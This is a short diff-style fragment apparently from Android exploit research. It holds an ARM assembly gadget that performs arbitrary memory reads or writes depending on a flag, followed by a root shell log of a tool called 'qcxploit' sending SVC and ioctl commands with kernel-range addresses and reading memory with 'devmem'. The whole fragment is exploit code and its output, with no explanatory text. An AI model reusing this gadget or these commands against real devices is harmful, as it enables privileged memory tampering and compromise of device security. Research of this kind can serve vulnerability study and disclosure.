@@ -1,0 +1,20 @@
+# R0 = writeflag, R1=addr, R2=value, R3=readmemptr
+PUSH {R4-R6,LR}
+CMP  R0, #0x22
+BEQ  write
+LDR  R0, [R1]
+STR  R0, [R2]
+B exit
+write:
+STR  R2, [R1]
+exit:
+POP {R4-R6,PC}
+
+#/data/local/tmp/qcxploit svcreg32 03 06 03 0x0 0xFE808796 0xFE82830c
+root@bacon:/ # /data/local/tmp/qcxploit svcreg32 03 06 03 0x0 0xFE808796 0xFE82830c
+Sending SVC: 0x3, CMD: 0x6
+IOCTL RES: 0x0000002E
+root@bacon:/ # /data/local/tmp/qcxploit svcreg32 03 06 03 0x22 0xFC48B080 0x0      
+Sending SVC: 0x3, CMD: 0x6
+IOCTL RES: 0x0000002E
+root@bacon:/ # /data/local/tmp/qcxploit devmem 0xFE82830c
